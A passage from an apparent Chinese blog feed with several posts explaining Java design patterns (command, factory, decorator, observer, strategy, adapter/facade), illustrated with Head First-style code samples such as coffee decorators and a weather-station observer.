title="外观模式和适配器的使用"></a>外观模式和适配器的使用</h3><ul><li>当需要一个现有类而接口不符合要求时，使用适配器。</li><li>当需要简化并统一一个很大的接口或者一群很复杂接口时，使用外观。(将客户和子系统解耦)</li></ul><p>github:<a href="https://github.com/ding-zou/design_mode" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/ding-zou/design_mode</a></p>]]></content>
    
    <summary type="html">
    
      适配器模式：将一个类的接口，转换成客户期望的有两个接口。适配器让原来的接口不兼容的类可以合作无间。外观模式：提供了一个同一的接口，用来访问子系统中的一群接口。外观定义了一个高层接口，让子系统更容易使用。
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Java设计模式——命令模式</title>
    <link href="https://www.dzou.top/post/667421d7.html"/>
    <id>https://www.dzou.top/post/667421d7.html</id>
    <published>2019-08-07T15:54:07.000Z</published>
    <updated>2019-08-08T04:43:31.899Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java设计模式之命令模式"><a href="#Java设计模式之命令模式" class="headerlink" title="Java设计模式之命令模式"></a>Java设计模式之命令模式</h2><p>他能帮助我们将<code>动作的请求者</code>和<code>动作的执行者</code>解耦</p><p>把请求封装（打开灯）成一个特定对象（打开厨房灯）</p><p><strong><em>命令模式：将“请求”封装成对象，以便使用不同的请求，队列或者日志来参数化其他对象，命令模式也可以支持可撤销的操作。</em></strong></p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/14.png"><p>遥控器当按下按键时，把控制灯开关、门开关的的请求提交，把请求提交给相应的<code>命令对象</code>执行其接受者对应的行为。</p><ul><li>测试类就是客户，创建很多命令对象，把它加载到遥控器卡槽</li><li>遥控器就是命令模式的客户，提交请求，通过<code>setCommand</code>方法把命令传给调用者</li><li>灯、车库就是具体的接受者，具有相应的行为</li><li>命令对象就是打开关闭灯、打开关闭门灯命令对象</li></ul><p>命令对象在遥控器中初始化时，使用了空对象<code>NoCommand</code>，也是一种设计模式，避免进行不必要的判断</p><pre><code class="java">//非空判断if(object!=null){    ....}</code></pre><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/13.png"><p>撤销功能：可以使用<code>添加状态变量</code>来获取前一次状态</p><p>多次撤销：可以使用<code>堆栈</code>记录每一次调用状态，撤销时从<code>堆栈</code>中取出</p><p>为什么命令对象不实现具体的<code>execute</code>方法？</p><p>答：我们尽量使用<code>傻瓜</code>的命令对象，不许关注接受者实现细节，实现调用者和接受者解耦。</p><h2 id="命令模式用途"><a href="#命令模式用途" class="headerlink" title="命令模式用途"></a>命令模式用途</h2><h3 id="队列请求"><a href="#队列请求" class="headerlink" title="队列请求"></a>队列请求</h3><p>命令可以将运算块打包，将他传来传去，命令对象创建许久后依然可以调用运算。</p><p>可以实现：日程安排、线程池、工作队列</p><h4 id="工作队列"><a href="#工作队列" class="headerlink" title="工作队列"></a>工作队列</h4><p>你在一端添加命令，在另一端使用线程依次取出命令并执行</p><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p>我们执行命令时将历史记录存储在磁盘里。一旦系统死机，我们就可以利用命令对象重新加载，依次调用他们的execute方法（使用序列化实现）</p><p>github：<a href="https://github.com/ding-zou/design_mode/tree/master/command_patterns" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/ding-zou/design_mode/tree/master/command_patterns</a></p>]]></content>
    
    <summary type="html">
    
      命令模式：将“请求”封装成对象，以便使用不同的请求，队列或者日志来参数化其他对象，命令模式也可以支持可撤销的操作。
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Java 设计模式——工厂模式</title>
    <link href="https://www.dzou.top/post/4caa56ee.html"/>
    <id>https://www.dzou.top/post/4caa56ee.html</id>
    <published>2019-08-06T04:56:52.000Z</published>
    <updated>2019-08-06T04:59:43.526Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java设计模式之工厂模式"><a href="#Java设计模式之工厂模式" class="headerlink" title="Java设计模式之工厂模式"></a>Java设计模式之工厂模式</h2><p>工厂模式有下面两种:</p><ol><li><p>简单工厂模式</p></li><li><p>工厂方法模式</p></li><li><p>抽象工厂模式</p></li></ol><h3 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h3><ul><li><p>系统扩展困难，一旦添加新产品就不得不修改工厂逻辑，在产品类型较多时，有可能造成工厂逻辑过于复杂，不利于系统的扩展和维护。</p></li><li><p>简单工厂模式由于使用了静态工厂方法，造成工厂角色无法形成基于继承的等级结构。</p></li><li><p>工厂类集中了所有产品创建逻辑，一旦不能正常工作，整个系统都要受到影响。</p></li></ul><h3 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h3><p><strong><em>工厂方法模式：定义了一个创建对象的接口，但由子类决定要实例化哪一个。工厂方法把类实例化延迟到子类。抽象工厂模式：提供一个接口，用于创建相关或者依赖对象的家族，而不需要明确指定具体类。</em></strong></p><p><code>接口</code>，广义的说法，指的是<code>抽象类或方法</code>和<code>接口或接口方法</code></p><ul><li>创建者类：抽象类，定义了一个抽象工厂方法，让子类实现此方法制造产品。</li><li>具体创建者类：创建者的子类，实现了工厂方法，由该子类决定要实例化哪一个类不代表子类真正决定创建哪一个产品，而是说编写创建者类时，不需要具体知道需要创建哪一个类，而是根据选择哪一个类，就自然在运行时创建该产品类。</li><li>产品类：抽象类或接口，实现该产品接口创建具体的产品类，在使用时只需要把引用指向他，而不是具体的类(<code>多态</code>)。</li></ul><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/11.png"><p>这样做的目的：</p><ul><li>使用子类实现创建产品帮助我们将产品的<code>实现</code>和<code>使用</code>解耦，需要增加产品或者改变产品的实现时，创建者都不受影响。</li><li>客户端不需要知道具体产品类的类名，只需要知道所对应的工厂即可。</li></ul><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/12.png"><h4 id="依赖倒置"><a href="#依赖倒置" class="headerlink" title="依赖倒置"></a>依赖倒置</h4><p>设计原则：</p><ul><li>要依赖抽象，不依赖具体类。</li></ul><blockquote><p>不能让<code>高层组件</code>依赖<code>低层组件</code>。高层组件：由其他低层组件定义其行为的类（有低层组件构成，具体更复杂的功能），面向接口编程的思想。</p></blockquote><p>问题：类A直接依赖类B，假如要将类A改为依赖类C，则必须通过修改类A的代码来达成。这种场景下，类A一般是高层模块，负责复杂的业务逻辑；类B和类C是低层模块，负责基本的原子操作；假如修改类A，会给程序带来不必要的风险。</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/9.png"><h3 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h3><p><strong><em>抽象工厂模式：提供一个接口，用于创建相关或者依赖对象的家族，而不需要明确指定具体类。</em></strong></p><p>接口中创建每个产品的接口就使用了工厂方法。</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/10.png"><h3 id="普通工厂、抽象工厂模式和工厂方法模式比较"><a href="#普通工厂、抽象工厂模式和工厂方法模式比较" class="headerlink" title="普通工厂、抽象工厂模式和工厂方法模式比较"></a>普通工厂、抽象工厂模式和工厂方法模式比较</h3><p>比较：</p><ul><li><p>普通工厂不是一种设计模式，但是实现了对象创建的封装和松耦合</p></li><li><p>工厂方法使用继承：把创建委托给子类，子类实现工厂方法创建产品</p></li><li><p>抽象工厂使用组合：对象的创建被实现接口方法的类创建</p></li></ul><p>优点：</p><ul><li>都实现松耦合，把应用程序和具体类促进解耦</li><li>依赖倒置原则：避免依赖具体对象，尽量依赖抽象</li></ul><p>使用：</p><ul><li>抽象工厂：当你需要创建一整套产品家族时使用</li><li>工厂方法：把产品使用和实例化解耦。如果你不知道要实例化哪些类时可以使用。</li></ul><p>代码：</p><p><a href="https://github.com/ding-zou/design_mode/tree/master/facotory_patterns" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/ding-zou/design_mode/tree/master/facotory_patterns</a></p>]]></content>
    
    <summary type="html">
    
      工厂方法模式：定义了一个创建对象的接口，但由子类决定要实例化哪一个。工厂方法把类实例化延迟到子类。
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Java设计模式——装饰者模式</title>
    <link href="https://www.dzou.top/post/1b3210b0.html"/>
    <id>https://www.dzou.top/post/1b3210b0.html</id>
    <published>2019-08-05T04:04:46.000Z</published>
    <updated>2019-08-06T04:58:59.625Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java设计模式之装饰者模式"><a href="#Java设计模式之装饰者模式" class="headerlink" title="Java设计模式之装饰者模式"></a>Java设计模式之装饰者模式</h2><p>前面两篇文章介绍了四个设计模式的原则：</p><ul><li>把变化的抽取出来，不要和不变化的放在一起</li><li>针对接口编程，不针对实现编程</li><li>多用组合，少用继承</li><li>为了交互对象之间的松耦合的设计而努力。</li></ul><p>现在我们要介绍最重要的设计原则：</p><ul><li>类应该对扩展开放，对修改关闭</li></ul><p><strong><em>装饰者模式：动态地将责任附加到对象上。若要扩展功能，装饰者提供比继承更有弹性的替代方案。</em></strong></p><p>可以动态地给对象添加一些额外的属性或者行为</p><p>装饰者模式：</p><ul><li>装饰者和被装饰者有相同的超类</li><li>可以用一个或者多个装饰者包装一个对象</li><li>因为装饰者和被装饰者有相同的超类，所以在任何需要原始对象（被包装的）的时候，你都可以用装饰过的对象替代。</li><li>装饰者可以在被装饰者的行为前后添加自己的行为。</li><li>装饰者可以如何时候被装饰，可以运行时动态地装饰对象。</li></ul><h3 id="Head-First-设计模式中案例"><a href="#Head-First-设计模式中案例" class="headerlink" title="Head First 设计模式中案例"></a>Head First 设计模式中案例</h3><p>星巴克做的咖啡有很多种类，我们想在这些咖啡上添加一些原料（牛奶、豆浆、奶泡、摩卡），还有咖啡的规格Size（大中小），我们决定使用装饰者模式来完成</p><ul><li><p>装饰者就是具体的原料类</p></li><li><p>被装饰者就是具体咖啡类</p></li></ul><p>我们使用一个抽象的<code>Beverage</code>类描述星巴克的咖啡（当然也可以使用接口），各个不同种类的咖啡继承该抽象类，我们还需要一个抽象的装饰者类，继承该装饰者类实现具体的原料装饰类，根据装饰者模式的<code>被装饰者和装饰者用相同的超类</code>，我们的装饰者抽象类需要继承<code>Beverage</code>类</p><p>计算价格我们要调用最外层的<code>cost</code>方法，每一层会委托<code>它装饰的对象-被装饰者</code>计算出价格</p><p>当我们最外层装饰者为奶泡<code>Whip</code>时，它会委托给上一层装饰者摩卡<code>Mocha</code>计算出摩卡所装饰的具体咖啡的价格+摩卡的价格；然后再加上自己奶泡的价格。(之所以可以这样实现调用多层cost是因为他们都来自一个超类对象)</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/6.png"><p>Beverage类：</p><pre><code class="java">public abstract class Beverage {    //规格    protected Size size = Size.UNKNOWN;    public void setSize(Size size){        this.size = size;    }    //描述    protected String description = &quot;unKnown Beverage&quot;;    public String getDescription(){        return description;    }    //价格    public abstract double cost();}</code></pre><p>我们使用枚举类定义Size：</p><ul><li>小杯+0.1元</li><li>中杯+0.15元</li><li>大杯+0.2元</li></ul><pre><code class="java">public enum Size {    SMALL(0.10)    ,MEDIUM(0.15)    ,BIG(0.20)    ,UNKNOWN(0);    private double cost;    Size(double v) {        cost = v;    }    public double getCost(){return cost;}}</code></pre><p>三个具体的咖啡类：</p><pre><code class="java">/** * 深培咖啡 */public class DarkRoast extends Beverage{    //构造时传入规格    public DarkRoast(Size size){        setSize(size);        if(this.size==Size.UNKNOWN){            throw new RuntimeException();        }        description = &quot;DarkRoast &quot;+this.size.name();    }//30.00元+规格需加的钱    public double cost() {        return 30.00+size.getCost();    }}</code></pre><pre><code class="java">/** *浓缩咖啡 */public class Espresso extends Beverage{    public Espresso(Size size){        setSize(size);        if(this.size==Size.UNKNOWN){            throw new RuntimeException();        }        description = &quot;Espresso &quot;+this.size.name();    }    public double cost() {        return 25.00+size.getCost();    }}</code></pre><pre><code class="java">/** * 混合咖啡 */public class HouseBlend extends Beverage{    public HouseBlend(Size size){        setSize(size);        if(this.size==Size.UNKNOWN){            throw new RuntimeException();        }        description = &quot;HouseBlend &quot;+this.size.name();    }    public double cost() {        return 50.00+size.getCost();    }}</code></pre><p>原料装饰者抽象类：</p><pre><code class="java">public abstract class CondimentDecorator extends Beverage {    //描述中需要有原料信息，所以需要重写该抽象方法    public abstract String getDescription();}</code></pre><p>四个原料装饰者类：</p><ul><li>牛奶、摩卡、豆浆、奶泡</li></ul><pre><code class="java">public class Milk extends CondimentDecorator{    private Beverage beverage;    //构造方法传入需要装饰的咖啡    public Milk(Beverage beverage){        this.beverage = beverage;    }    //牛奶需要多加9元    public double cost() {        return beverage.cost()+9.00;    }    //重写的描述放方法    public String getDescription() {        return beverage.getDescription()+&quot; with Milk&quot;;    }}</code></pre><pre><code class="java">public class Mocha extends CondimentDecorator{    private Beverage beverage;    public Mocha(Beverage beverage){        this.beverage = beverage;    }    public double cost() {        return beverage.cost()+7.00;    }    public String getDescription() {        return beverage.getDescription()+&quot; with Mocha&quot;;    }}</code></pre><pre><code class="java">public class Soy extends CondimentDecorator{    private Beverage beverage;    public Soy(Beverage beverage){        this.beverage = beverage;    }    public double cost() {        return beverage.cost()+5.00;    }    public String getDescription() {        return beverage.getDescription()+&quot; with Soy&quot;;    }}</code></pre><pre><code class="java">public class Whip extends CondimentDecorator{    private Beverage beverage;    public Whip(Beverage beverage){        this.beverage = beverage;    }    public double cost() {        return beverage.cost()+15.00;    }    public String getDescription() {        return beverage.getDescription()+&quot; with Whip&quot;;    }}</code></pre><p>编写测试类：</p><pre><code class="java">public class Main {    public static void main(String[] args) {        DarkRoast darkRoast = new DarkRoast(Size.BIG);        Milk mb = new Milk(darkRoast);        System.out.println(mb.getDescription()+&quot;,cost:&quot;+mb.cost());        Mocha mochab = new Mocha(new Espresso(Size.SMALL));        System.out.println(mochab.getDescription()+&quot;,cost:&quot;+mochab.cost());        Soy sb = new Soy(new HouseBlend(Size.MEDIUM));        System.out.println(sb.getDescription()+&quot;,cost:&quot;+sb.cost());        Whip wb = new Whip(new DarkRoast(Size.BIG));        System.out.println(wb.getDescription()+&quot;,cost:&quot;+sb.cost());        Milk mb2 = new Milk(mb);        System.out.println(mb2.getDescription()+&quot;,cost:&quot;+mb2.cost());        Soy soyb = new Soy(mb2);        System.out.println(soyb.getDescription()+&quot;,cost:&quot;+soyb.cost());        Whip whipb = new Whip(soyb);        System.out.println(whipb.getDescription()+&quot;,cost:&quot;+whipb.cost());    }}</code></pre><p>输出如下</p><pre><code class="java">output：DarkRoast BIG with Milk,cost:39.2Espresso SMALL with Mocha,cost:32.1HouseBlend MEDIUM with Soy,cost:55.15DarkRoast BIG with Whip,cost:55.15DarkRoast BIG with Milk with Milk,cost:48.2DarkRoast BIG with Milk with Milk with Soy,cost:53.2DarkRoast BIG with Milk with Milk with Soy with Whip,cost:68.2</code></pre><h3 id="JDK中装饰者——IO"><a href="#JDK中装饰者——IO" class="headerlink" title="JDK中装饰者——IO"></a>JDK中装饰者——IO</h3><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/8.png"><p>IO中<code>InputStream</code>和<code>OutputStream</code>就是抽象的超类，<code>Reader</code>和<code>Writer</code>也是抽象的超类。整个IO家族都是由装饰者模式构成的。</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/7.png">]]></content>
    
    <summary type="html">
    
      装饰者模式：装饰者和被装饰者有相同的超类-可以用一个或者多个装饰者包装一个对象，因为装饰者和被装饰者有相同的超类，所以在任何需要原始对象（被包装的）的时候，你都可以用装饰过的对象替代，装饰者可以在被装饰者的行为前后添加自己的行为，装饰者可以如何时候被装饰，可以运行时动态地装饰对象。
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Java设计模式——观察者模式</title>
    <link href="https://www.dzou.top/post/261ed4ab.html"/>
    <id>https://www.dzou.top/post/261ed4ab.html</id>
    <published>2019-08-04T04:15:54.000Z</published>
    <updated>2019-08-06T04:58:56.645Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java设计模式之观察者模式"><a href="#Java设计模式之观察者模式" class="headerlink" title="Java设计模式之观察者模式"></a>Java设计模式之观察者模式</h2><p>前面一篇文章提到了策略模式，提出了三个设计原则，这里提出第四个设计原则</p><p>设计原则：</p><ul><li>为了交互对象之间的松耦合的设计而努力。</li></ul><p>针对报社：<code>出版者</code>+<code>订阅者</code>=<code>观察者模式</code></p><p>报社是获取信息的主题对象，当报社获取到的信息更新了，报社将把信息传送给它的订阅者；当然订阅者也可以通知报社停止订阅，报社就把该对象从订阅者列表中去除，他不再能接收到报社传送的信息。</p><p><strong>观察者模式：定义了对象之间的一对多依赖，这样一来，当一个对象改变状态时。它的所有依赖者都会收到通知并自动更新。</strong></p><p>观察者模式有两个部分：</p><ul><li>观察者</li><li>主题（也叫被观察者）</li></ul><p>一个主题对象关联了多个观察者，当主体对象有数据更新或者状态改变时，它就可以通知它所关联的观察者们；就如果狗对象、猫对象、老鼠对象已经注册成为观察者，他们就将在主体对象数据更新时接收到主题对象发送的通知（通知数据更新了，你可以通过pull或者push的方式获取），这也就是<code>java.util</code>包下的<code>Observer</code>和<code>Observable</code>实现的观察者模式</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/4.png"><p>我们通过Head FIrst 设计模式中的场景实现观察者模式</p><p><strong><em>场景：一个气象站由<code>WeatherData</code>类或者气象数据<code>温度、湿度、气压</code>，作为主题类，由多个公告板（展示效果不同，数据都是这三个）作为观察者类，当气象数据更新或者改变时，该类将通知公告板更新展示的数据。</em></strong></p><p>WeatherData该主题需要能<code>添加观察者</code>，<code>删除观察者</code>，<code>通知观察者更新数据</code>,并且要获取气象局发布的数据</p><p>我们把主体对象写一个接口如下，不同主题实现不同功能只需实现该接口</p><pre><code class="java">public interface Subject {    //添加观察者    void registerObserver(Observer o);    //删除    void removeObserver(Observer o);    //通知    void notifyObservers(List&lt;Observer&gt; o);    void setChanged();    boolean getChanged();}</code></pre><p>其中<code>setChanged方法</code>把数据是否更新的状态的标志设置为True，在更新状态或者数据时执行该方法</p><p><code>getChanged()</code>获取该标志</p><p><code>WeatherData</code>只需实现该接口，添加获取气象数据的方法即可</p><pre><code class="java">public class WeatherData implements Subject{    private WeatherArgs args = new WeatherArgs();    private List&lt;Observer&gt; obs = new ArrayList&lt;&gt;();    private boolean changed = false;    //设置数据    void setWeatherData(String template,String humidity,String pressure){        args.setTemplate(template);        args.setHumidity(humidity);        args.setPressure(pressure);        //更新完成后设置标志为true        setChanged();        //调用更新后通知观察者方法        onWeatherDataChanged();    }    //数据更新时通知观察者 push数据给观察者    private void onWeatherDataChanged(){        if(getChanged()){            notifyObservers(obs);        }    }    //观察者注册    public void registerObserver(Observer o) {        if(o==null){            throw new RuntimeException();        }        obs.add(o);    }    //观察者移除    public void removeObserver(Observer o) {        obs.remove(o);    }    //通知观察者们数据更新 发送数据给观察者们    public void notifyObservers(List&lt;Observer&gt; obs) {        obs.forEach((o)-&gt;o.update(this,args));    }    @Override    public void setChanged() {        changed = true;    }    @Override    public boolean getChanged() {        return changed;    }}</code></pre><p>其中<code>WeatherArg</code>为气象数据参数类，当我们不使用这个类时，我们需要每次更新时传入特定的值，下面这样</p><pre><code class="java">update(String template,String humidity,String pressure);update(100,200,200kpa);</code></pre><p>这样需要更改数据种类和数量时，需要修改很多代码，所以我们把它封装起来</p><pre><code class="java">@Dataclass WeatherArgs {    //温度    private String template;    //湿度    private String humidity;    //气压    private String pressure;}</code></pre><p>添加这个类是为了如果需要更改数据类型和数量时只需更改这个类就行</p><p>我们用List存放观察者，<code>onWeatherDataChanged</code>方法检测是否更新，如果更新就通知观察者</p><p>观察者有多个，其中都有<code>update</code>方法执行被通知时更新数据，通过不同的<code>display</code>方法展示不同效果的气象数据，我们编写两个接口</p><ul><li>观察者接口 （有多个观察者）Observer</li><li>展示数据接口（有不同展示方法） Displayable</li></ul><pre><code class="java">public interface Observer {    /**     * 更新数据     * @param subject 主题对象     * @param args 更新参数     */    void update(Subject subject,Object args);}</code></pre><pre><code class="java">public interface Displayable {    /**     * 数据展示方法     */    void display();}</code></pre><p>下面我们实现一个观察者</p><p>它需要实现<code>Observer和`Displayable</code>接口实现<code>update和display</code>方法</p><p>我们在构造方法传入一个主题对象，告诉他我们要订阅他</p><pre><code class="java">public class CurrentConditionDisplay implements Observer,Displayable{    //可用于观察者对主题对象取消订阅    private Subject subject;    private WeatherArgs weatherArgs;    //创建时注册    public CurrentConditionDisplay(Subject s){        s.registerObserver(this);        subject = s;    }    @Override    public void update(Subject subject, Object args) {        if(subject instanceof WeatherData){            weatherArgs = (WeatherArgs) args;            display();        }    }    @Override    public void display() {        System.out.println(&quot;template:&quot;+weatherArgs.getTemplate()+&quot;, humidity:&quot;+weatherArgs.getHumidity()+&quot;, pressure:&quot;+weatherArgs.getPressure());    }    //观察者取消订阅 通知主题对象删除我    private void removeMe(){        subject.removeObserver(this);    }}</code></pre><p>至此，观察者模式就完成了</p><p>写一个测试类：</p><pre><code class="java">public class Main {    public static void main(String[] args) {        WeatherData weatherData = new WeatherData();        CurrentConditionDisplay currentConditionDisplay = new CurrentConditionDisplay(weatherData);        weatherData.setWeatherData(&quot;100&quot;,&quot;90&quot;,&quot;100KPa&quot;);    }}</code></pre><pre><code class="java">output：template:100, humidity:90, pressure:100KPa</code></pre><blockquote><p>大家可以看一下JDK中内置的<code>Observer和Observable</code>实现的观察者模式，大体实现是一样的</p></blockquote><p>JDK内置观察者模式</p><p><code>Observable</code>被观察者</p><pre><code class="java">public class Observable {    private boolean changed = false;    private Vector&lt;Observer&gt; obs;    public Observable() {        obs = new Vector&lt;&gt;();    }    public synchronized void addObserver(Observer o) {        if (o == null)            throw new NullPointerException();        if (!obs.contains(o)) {            obs.addElement(o);        }    }    public synchronized void deleteObserver(Observer o) {        obs.removeElement(o);    }    public void notifyObservers() {        notifyObservers(null);    }    public void notifyObservers(Object arg) {        Object[] arrLocal;        synchronized (this) {            if (!changed)                return;            arrLocal = obs.toArray();            clearChanged();        }        for (int i = arrLocal.length-1; i&gt;=0; i--)            ((Observer)arrLocal[i]).update(this, arg);    }    public synchronized void deleteObservers() {        obs.removeAllElements();    }    protected synchronized void setChanged() {        changed = true;    }    protected synchronized void clearChanged() {        changed = false;    }    public synchronized boolean hasChanged() {        return changed;    }    public synchronized int countObservers() {        return obs.size();    }}</code></pre><p><code>Observer</code></p><pre><code class="java">public interface Observer {    //o为被观察者主题，args为更新的数据    void update(Observable o, Object arg);}</code></pre><p>但是我们可以看到该<code>Observable</code>是具体的实现类，不符合设计模式中的</p><ul><li>多用组合少用继承</li></ul><p>不方便我们继承其他类</p><p>有两个办法 ：</p><ul><li>使用上述我们自己实现的观察者模式</li><li>扩展Observable类</li></ul><p>代码地址：<a href="https://github.com/ding-zou/design_mode/tree/master/observer_patterns" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/ding-zou/design_mode/tree/master/observer_patterns</a></p>]]></content>
    
    <summary type="html">
    
      当对象间存在一对多关系时，则使用观察者模式（Observer Pattern）。比如，当一个对象被修改时，则会自动通知它的依赖对象。观察者模式属于行为型模式。
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Java设计模式——策略模式</title>
    <link href="https://www.dzou.top/post/6c84d9a1.html"/>
    <id>https://www.dzou.top/post/6c84d9a1.html</id>
    <published>2019-08-03T06:15:05.000Z</published>
    <updated>2019-08-06T04:58:53.813Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java设计模式之策略模式"><a href="#Java设计模式之策略模式" class="headerlink" title="Java设计模式之策略模式"></a>Java设计模式之策略模式</h2><p>设计模式基础：</p><ul><li>抽象</li><li>多态</li><li>继承</li><li>组合</li></ul><p>设计原则：</p><ul><li><p>把变化的抽取出来，不要和不变化的放在一起</p></li><li><p>针对接口编程，不针对实现编程</p></li><li><p>多用组合，少用继承</p></li></ul><p>我们先把定义提出来：</p><p><strong>策略模式：定义了算法族，分别封装起来，让他们之间可以相互替换，此模式让算法的变化独立于使用算法的客户。</strong></p><p>这个概念比较难理解，下面我们具体通过案例分析一下</p><p>场景：我们有三个不同种类的程序员，JavaWeb、大数据BigData和Ai人工智能程序员；他们都有相同的喝水和睡觉行为，但是有不同的写代码行为（写JavaWeb，写Ai，写Big data），我们想一下怎么实现？</p><p>我们首先想到的是使用<code>继承重写父类的方法</code>实现，但是这样做的缺点很多：</p><pre><code class="java">Class JavaWebProgrammer extends Programmer{    public void doSleeping(){        //重写代码    }    public void doCoding(){        //重写代码    }}</code></pre><ul><li>可以解决问题，但是代码无法复用</li><li>多一个类都要重新写它对应的实现，代码量太大</li><li>不符合三个设计原则</li><li>而且无法解决有些类没有或者不需要基类的某个功能 比如有的程序员退休了，有的没有退休</li></ul><p>此时，针对<code>某个类不需要实现基类某个功能</code>你又想到了在重写中什么都不做的方法：</p><pre><code class="java">public void retired(){    //do noting}</code></pre><p>但是这样依然没有解决上面的根本问题，所以我们又想到了<code>使用接口</code>：把不会变化的功能（睡觉行为和喝水行为依然放在基类里，会变化的行为（写代码行为）写成一个接口<code>Codeable</code>，然后通过继承基类实现不变的行为，实现Codeable接口实现不同的写代码行为</p><p>但是这么做还是不行：</p><ul><li>如果有很多子类的实现需要修改，那么我们要修改很多的代码</li></ul><p>这个时候我们就应该充分考虑<code>设计原则</code>的作用了</p><ul><li>把变化的部分封装起来</li><li>面向接口编程</li></ul><p>大家就可以想到把接口的实现独立成一个个类，把写代码行为写成一个接口，不同的实现对应不同的实现类，然后我们在使用时，想到了<code>多态</code>的奇妙之处，根据多态的动态调用</p><p>如下：</p><pre><code class="java">ProgramBehavior programBehavior = new JavaWebBehavior();programBehavior.doCoding();</code></pre><p>在此，我们大体思路已经很接近成功了</p><ul><li><p>首先基类声明为<code>抽象类</code>，里面有睡觉和喝水行为的具体实现（不变的）</p><pre><code class="java">    protected void doDrinking(){        System.out.println(&quot;I am drinking.&quot;);    }    protected void doSleeping(){        System.out.println(&quot;I am sleeping&quot;);    }</code></pre></li><li><p>在基类中声明变化的部分，使用接口的形式使得我们可以动态调用</p><pre><code class="java">ProgramBehavior programBehavior；void doCoding(){    programBehavior.doCoding();}</code></pre></li><li><p>创建写代码行为的接口</p><pre><code class="java">public interface ProgramBehavior {    void doCoding();}</code></pre></li><li><p>子类<code>AIProgrammer</code>继承抽象类<code>Programmer</code>，只需要在初始化时创建<code>AIBehavior</code>赋给我们基类的接口<code>programBehavior</code></p><pre><code class="java">public class AIProgrammer extends Programmer {    public AIProgrammer(){        programBehavior = new AIBehavior();    }}</code></pre></li><li><p>创建不同的接口实现类，实现不同的写代码行为</p><pre><code class="java">public class AIBehavior implements ProgramBehavior {    @Override    public void doCoding() {        System.out.println(&quot;I am doing AI coding.&quot;);    }}</code></pre></li><li><p>测试</p><pre><code class="java">public void testAI(){        Programmer aiProgrammer = new AIProgrammer();        aiProgrammer.doDrinking();        aiProgrammer.doCoding();        aiProgrammer.doSleeping();    }</code></pre><p>结果如下：</p></li></ul><img 